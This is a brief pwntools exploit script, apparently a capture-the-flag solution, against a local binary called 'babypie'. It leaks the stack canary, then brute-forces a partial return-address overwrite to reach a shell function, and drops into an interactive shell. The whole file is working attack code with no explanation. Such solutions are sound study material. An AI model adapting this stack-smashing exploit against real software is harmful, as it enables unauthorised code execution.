#!/usr/bin/env python
from pwn import *
# context.log_level = 'debug'
context.arch = 'amd64'
while True:
	try:
		p = process('./babypie', timeout = 1)
		# gdb.attach(p)
		p.sendafter(':\n', 'A' * (0x30 - 0x8) + ':')
		p.recvuntil(':')
		data = '\0' + p.recvn(7)
		canary = u64(data)
		success('canary = ' + hex(canary))
		system = 0xA3E
		payload = flat([
			'A' * (0x30 - 0x8), 
			canary, 
			'B' * 8, 
			system
		])
		p.sendafter(':\n', payload)
		p.interactive()
	except Exception as e:
		p.close()
		print e
